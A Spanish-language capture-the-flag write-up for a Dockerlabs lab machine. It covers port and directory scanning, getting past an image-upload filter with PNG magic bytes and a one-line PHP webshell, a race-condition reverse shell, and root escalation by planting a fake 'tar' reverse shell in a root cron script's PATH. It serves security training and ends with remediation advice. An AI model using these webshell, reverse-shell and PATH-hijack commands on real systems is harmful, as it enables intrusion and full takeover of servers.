# Enumeracion

Primero para empezar el ctf, se utilizara nmap para descubrir cuales son los puertos abiertos en la maquina victima:



```java
Comando nmap utilizado:
nmap -sCV -vvv -Pn -p- 172.17.0.2 -oN nmap.txt

Salida:
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.69 ((Debian))
|_http-server-header: Apache/2.4.69 (Debian)
|_http-title: Zumba Files \xE2\x80\x94 Env\xC3\xADa archivos en segundos
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
MAC Address: 6A:D6:9B:11:D2:81 (Unknown)
```

Ahora, sabiendo que existe una pagina web en el puerto 80(http) es hora de visitar para hacer un relevamiento de posibles vulnerabilidades que se puedan aprovechar. 

![[Dockerlabs/toctou/images/Screenshot_2026-11-03_16_20_53.png]]

Parece que la pagina web es un sitio para subir y compartir archivos como lo es mediafire o MEGA. Tiene 3 secciones, el `inicio`(donde estamos), `Archivos recientes`(donde se ven los archivos subidos) y `Quienes somos`(brinda informacion de la empresa). 

Por ahora nada que resalte, asi que vamos a realizar un escaneo de directorios con `gobuster` para intentar identificar directorios nuevos.

```go
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2/ -x html,txt,js,py,db,php                    
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
index.html           (Status: 200) [Size: 3070]  
uploads              (Status: 301) [Size: 350] [--> http://172.17.0.2/uploads/]  
assets               (Status: 301) [Size: 349] [--> http://172.17.0.2/assets/]  
upload.php           (Status: 400) [Size: 62]  
archivos             (Status: 301) [Size: 351] [--> http://172.17.0.2/archivos/]  
server-status        (Status: 403) [Size: 315]  
Progress: 1453487 / 1453487 (100.00%)  
===============================================================  
Finished  
===============================================================
```

Bien, nada nuevo o que resalte aqui, vamos a tratar de subir un archivo malicioso en formato `.php` que su contenido va a ser una reverse shell o shell reversa. 

Al tratar de hacer esto, la pagina nos responde con un `Solo se permiten imágenes (PNG, JPG, GIF o BMP).` Es en este caso, que vamos a tener que saltarnos la comprobacion de la extension del archivo. 

# Explotación

Tratando de cambiar solamente la extension del archivo no sirve, asi que es hora de usar burpsuite para ver si se puede interceptar la peticion y cambiar el contenido de esa manera.

Una vez en burpsuite pasamos la peticion con la reverse shell a "repeater" o repetidor en burpsuite para poder hacer pruebas con la peticion de manera rapida.

Para este caso se usa una reverse shell de pentestmonkey [[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php]]

Una vez intereceptamos la petición, mandamos al repeater la peticion. Cuando tratamos de mandar la peticion sin modificar nada, tenemos este mensaje de error:

```json
HTTP/1.1 400 Bad Request
Date: Tue, 03 Nov 2026 22:07:41 GMT
Server: Apache/2.4.69 (Debian)
Content-Length: 76
Connection: close
Content-Type: application/json; charset=utf-8

{"ok":false,"error":"Solo se permiten im\u00e1genes (PNG, JPG, GIF o BMP)."}
```

Solo se permiten archivos (PNG, JPG, GIF o BMP), asi que tratamos de modificar el contenido de `Content-Type` buscando hacerle creer al backend que esta frente a un archivo png. En este caso nos da el mismo error, por ende, buscamos otra forma de saltarnos las restricciones, tratando de hacerle creer al backend que esta frente a un archivo png legimito poniendo los bytes magicos de el archivo png primeros asi falsificamos dicho archivo. El proceso para hacer eso es el siguiente:

```bash
head -n 5 Screenshot_2026-11-03_16_20_53.png > revshell1.php
```

En este caso el comando `head` imprime las primeras 10 lineas del archivo que le damos, de esta forma ponemos primeros los bytes magicos de el archivo png, en este caso se uso una screenshot para facilitar su realizacion.

Esto nos borra el contenido de nuestro archivo, asi que lo agregamos a mano de vuelta.

Tratamos de subir de vuelta el archivo `revshell1.php` cambiando el Content-Type con `image/png`, es decir quedaria `Content-Type: image/png`. Lamentablemente el sistema nos tira este error:

```java
El análisis detectó contenido potencialmente peligroso. Archivo rechazado.
```

Es decir que en el backend se hace una verificacion del contenido del archivo en busqueda de contenido peligroso valga la redundancia.

Es por ello que se llego a la conclusion de tratar de hacer un archivo con la menor cantidad de lineas posibles, en este caso se usara la siguiente sentencia en PHP porque parece que el backend filtra cualquier cadena de texto que contenga `php` en ella:

```php
<?system($_GET['cmd']);?>
```

Una vez hecho eso, mandamos la peticion y tenemos un:

```json
HTTP/1.1 200 OK
Date: Tue, 03 Nov 2026 22:23:13 GMT
Server: Apache/2.4.69 (Debian)
Content-Length: 44
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"ok":true,"url":"\/uploads\/revshell1.php"}
```

es decir que se subio correctamente nuestro archivo!

El archivo es subido pero no se ejecuta. El nombre de la maquina nos da una miniscula aclaracion de como aprovechar la subida de archivos en el servidor, que es mediante un `time-of-check to time-to-use (TOCTOU)` ==es una clase de vulnerabilidad y condición de carrera en software==. Ocurre cuando un programa verifica el estado o los permisos de un recurso (como un archivo, una identidad o una variable) y luego utiliza ese recurso un instante después, asumiendo que nada ha cambiado en el ínterin.

Con esto aclarado, cuando subimos la reverse shell, el archivo aparece en el servidor y es ejecutado sin antes realizar las verificaciones en ese corto plazo, antes de ser eliminado. Se agrega una reverse shell corta para poder tener establecer la reverse shell:

```bash
echo '<?php system("bash -c \"bash -i >& /dev/tcp/172.17.0.1/7777 0>&1 \"");?>' >> revshell1.php
```

y con `netcat` nos ponemos en escucha por el puerto 7777 para recibir la conexión:

```bash
sudo nc -nlvp 7777  
listening on [any] 7777 ...  
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 49156  
bash: cannot set terminal process group (23): Inappropriate ioctl for device  
bash: no job control in this shell  
www-data@0c4693c0880e:/var/www/html/uploads$
```


# Post-Explotación

y estamos adentro como el usuario `www-data`, investigando en la maquina victima, mas especificamente en el directorio `/opt/` se encuentra un archivo `backup.sh` con el siguiente contenido:

```bash
#!/bin/bash  
#  
# Zumba Files — copia de seguridad periódica de la carpeta de subidas.  
# Pensado para ejecutarse desde cron. Comprime /var/www/html/uploads en  
# /var/backups para poder recuperar envíos recientes si algo va mal.  
#  
# NOTA del equipo: cargamos nuestro directorio de utilidades propio delante  
# del PATH para poder usar versiones "tuneadas" de las herramientas de backup.  
export PATH=/opt/zumba/bin:$PATH  
  
STAMP=$(date +%Y%m%d-%H%M%S)  
cd /var/www/html/uploads || exit 0  
  
# Empaquetamos el contenido actual de la carpeta de subidas.  
tar -czf "/var/backups/uploads-${STAMP}.tar.gz" . 2>/dev/null  
  
# Rotación simple: conservamos solo las 5 copias más recientes.  
ls -1t /var/backups/uploads-*.tar.gz 2>/dev/null | tail -n +6 | xargs -r rm -f
```

La instruccion `export PATH=/opt/zumba/bin:$PATH` es peligrosa debido que permite un `path hijacking`, debido a que cuando el script se ejecuta, usara esa ruta en vez de una del sistema. ademas de eso el script se ejecuta como root. Entonces podemos crear un archivo `tar`, el cual despues se usara en dicho script con permisos de root para hacer un backup, si nosotros nos aprovechamos de esto, podemos realizar una reverse shell agregando un archivo tar  con dicho contenido en `/opt/zumba/bin/`

Contenido del archivo `tar`:

```bash
!/bin/bash
/bin/bash -i >& /dev/tcp/172.17.0.1/7777 0>&1
```

Como no tenemos ningun editor de texto, usaremos un one liner

```bash
echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.17.0.1/7777 0>&1' > tar
```

Le damos permisos de ejecucion a `tar`:

```bash
chmod +x tar
```

Despues movemos el archivo `tar` a `/opt/zumba/bin/`:

```bash
mv tar /opt/zumba/bin/
```

y nos ponemos a escuchar con `netcat`:

```bash
nc -lnvp 7777
```

y ahora esperamos a que se ejecute la tarea cron...

```java
root@a085f5ef6306:/var/www/html/uploads# whoami  
whoami  
root
```

y ya somos root!


# Conclusiones

En este CTF se puede visualizar como una mala lógica de sanitización de entradas o en este caso archivos, puede comprometer un sistema. En este caso se tomo provecho de la ejecución de archivos por parte del servidor, sin antes comprobar su contenido. 

Por parte la parte interna del sistema, un mal manejo de PATH, de manera mas exacta, la utilización de directorios con permisos de administrador o `root` permitieron poder escalar hacia el usuario root.

## Recomendaciones

- Validar el archivo que se va a subir antes de ser ejecutado.
- Cambiar el PATH del sistema, sacando `/opt/zumba/bin` por el de otro usuario menos privilegiado(www-data) o en su defecto usar rutas absolutas en los scripts cron.
